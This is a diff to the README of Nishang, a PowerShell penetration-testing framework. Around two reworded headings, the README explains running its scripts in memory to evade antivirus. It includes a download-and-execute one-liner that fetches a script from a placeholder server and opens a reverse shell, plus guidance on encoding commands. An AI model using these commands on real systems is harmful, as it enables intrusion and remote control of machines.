@@ -30,12 +30,12 @@ PS C:\nishang> Get-Help Get-WLAN-Keys -Full
 ####Anti Virus
 Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:
 
-1. Use the in-memory dowload and execute:
+Method 1. Use the in-memory dowload and execute:
 Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.
 
 powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 
-2. Use the -encodedcommand (or -e) parameter of PowerShell
+Method 2. Use the -encodedcommand (or -e) parameter of PowerShell
 All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".
 
 Encode the scrript using Invoke-Encode from Nishang:
